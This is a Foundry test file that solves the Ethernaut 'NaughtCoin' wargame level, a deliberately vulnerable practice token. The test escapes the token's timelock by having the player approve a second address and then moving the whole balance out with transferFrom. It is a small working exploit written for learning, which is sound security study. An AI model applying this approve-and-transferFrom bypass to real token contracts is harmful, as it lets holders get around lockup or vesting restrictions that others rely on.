// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";

contract NaughtCoinTest is Test {
    NaughtCoin public naughtCoin;
    address public player;
    address public spender;

    function setUp() public {
        player = makeAddr("player");
        naughtCoin = new NaughtCoin(player);
        spender = makeAddr("spender");
    }

    function testNaughtCoinExploit() public {
        uint256 amount = naughtCoin.balanceOf(player);

        // 1. Player approves spender to pull their locked tokens
        vm.prank(player);
        naughtCoin.approve(spender, amount);

        // 2. Spender transfers the approved tokens out via transferFrom
        vm.prank(spender);
        naughtCoin.transferFrom(player, spender, amount);

        // 3. Player's balance is now drained to 0
        assertEq(naughtCoin.balanceOf(player), 0);
    }
}
